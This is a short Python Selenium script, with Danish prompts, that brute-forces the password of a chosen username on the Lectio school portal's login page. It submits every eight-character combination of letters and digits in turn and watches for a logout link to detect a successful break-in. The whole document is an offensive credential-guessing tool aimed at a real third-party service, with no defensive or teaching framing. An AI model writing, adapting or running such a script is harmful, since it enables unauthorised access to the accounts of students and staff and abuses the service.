import selenium
import time
import string
import itertools
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager

login_succesful = False
chars = string.ascii_lowercase + string.digits + string.ascii_uppercase
username = input("Skriv et username: ")

while True:
    for password_length in range(8, 9):
            for guess in itertools.product(chars, repeat=password_length):
                guess = ''.join(guess)
                        
                driver = webdriver.Chrome(r"tilføj her hvor du har lagt chromedriver for eksempel: C:\Users\LectioBruger\Desktop\chromedriver\chromedriver.exe")

                driver.get('https://www.lectio.dk/lectio/681/login.aspx')

                id_box = driver.find_element_by_id('username')

                id_box.send_keys(username)

                id_box = driver.find_element_by_id('password')

                id_box.send_keys(guess)

                login_button = driver.find_element_by_id('m_Content_submitbtn2')

                login_button.click()

                try:
                    logout_button = driver.find_element_by_id("s_m_LoginOutLink")
                    if logout_button.is_displayed():
                        print("success")
                        login_succesful = True
                except selenium.common.exceptions.NoSuchElementException:
                    print("spurgt")